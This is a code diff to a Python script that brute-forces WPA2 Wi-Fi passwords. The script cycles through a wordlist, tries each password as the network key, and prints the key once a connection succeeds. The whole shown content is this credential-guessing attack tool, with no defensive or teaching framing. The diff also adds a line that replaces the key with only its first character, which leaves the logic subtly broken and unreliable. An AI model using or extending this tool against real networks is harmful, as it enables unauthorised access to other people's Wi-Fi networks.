@@ -39,6 +39,7 @@ def bruteforce():
         profile.akm.append(const.AKM_TYPE_WPA2PSK)
         profile.cipher = const.CIPHER_TYPE_CCMP
         profile.key = password
+        profile.key = password[0]
         interface.remove_all_network_profiles()
         new_profile = interface.add_network_profile(profile)
         time.sleep(1)
@@ -52,17 +53,17 @@ def bruteforce():
             print("Connected ! password for {} is {}\n".format(profile.ssid,
                                                                profile.key))
             print("Execution took {} seconds.".format(time.time()-start_time))
-            interface.disconnect()
+           # interface.disconnect()
             exit()
         else:
-            pass
+            print(profile.key)
 
 
 f = ''
 parser = argparse.ArgumentParser()
 parser.add_argument("file")
 args = parser.parse_args()
-f = args
+f = args.file
 print(f)
 if not os.path.exists(f):
     print(f)
